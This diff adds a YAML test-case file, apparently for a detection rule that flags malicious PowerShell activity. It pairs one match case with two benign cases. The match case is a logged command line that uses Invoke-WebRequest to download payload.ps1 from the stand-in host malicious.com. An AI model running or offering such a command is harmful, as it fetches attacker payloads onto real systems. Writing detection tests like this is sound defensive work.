@@ -1,0 +1,18 @@
+test_cases:
+  - description: "Malicious PowerShell one-liner using Invoke-WebRequest"
+    expected_match: true
+    log:
+      Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      CommandLine: "powershell.exe -NoProfile -Command Invoke-WebRequest -Uri http://malicious.com/payload.ps1 -OutFile payload.ps1"
+
+  - description: "Benign PowerShell execution (administrative script)"
+    expected_match: false
+    log:
+      Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      CommandLine: "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\maintenance.ps1"
+
+  - description: "False Positive trap: Admin running interactive pwsh session"
+    expected_match: false
+    log:
+      Image: "C:\\Program Files\\PowerShell\\7\\pwsh.exe"
+      CommandLine: "pwsh.exe"
